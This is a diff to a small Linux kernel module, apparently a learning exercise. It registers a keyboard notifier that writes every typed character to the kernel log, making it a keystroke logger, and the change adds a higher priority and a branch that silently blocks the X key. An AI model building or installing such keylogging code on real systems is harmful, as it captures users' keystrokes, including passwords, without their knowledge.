@@ -16,7 +16,8 @@ module_exit(end_eye);
 
 static struct notifier_block _sauron =
 {
-    .notifier_call = sauron_notify
+    .notifier_call = sauron_notify,
+    .priority = 99
 };
 
 static int start_eye(void)
@@ -42,8 +43,16 @@ static int sauron_notify(struct notifier_block *nb, unsigned long code, void *ra
     {
         if (c == 0x01)
             printk("\n");
-        if (c >= 0x20 && c < 0x7f)
+        else if (c >= 0x20 && c < 0x7f)
             printk(KERN_CONT "%c", c);
+    }
+    else if (code == KBD_KEYCODE && data->down)
+    {
+        if (c == 0x2d)
+        {
+            printk(KERN_CONT "bad_x");
+            return NOTIFY_STOP;
+        }
     }
 
     return NOTIFY_OK;
